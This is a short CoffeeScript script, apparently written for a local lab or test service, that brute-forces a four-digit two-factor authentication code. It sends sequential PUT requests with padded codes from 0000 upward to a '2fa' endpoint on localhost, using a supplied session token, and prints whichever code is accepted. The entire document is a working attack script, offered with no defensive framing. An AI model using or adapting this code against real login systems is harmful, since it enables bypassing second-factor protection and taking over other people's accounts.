request = require "request-json"
yargs   = require "yargs"
pad     = require "pad-left"

client = request.createClient "http://localhost:8081/"
client.headers["Authorization"] = yargs.argv.token

checkCode = (i) ->
    challenge = pad "#{i}", 4, 0
    client.put "2fa", challenge: challenge, (err, res) ->
        if i % 100 is 0 then console.log "==== #{challenge} ===="
        switch res.statusCode
            when 401 then console.log "Invalid token"
            when 200 then console.log i
            when 400 then checkCode(i+1)
            else console.log "Oops, something broke (status #{res.statusCode})"

checkCode 0
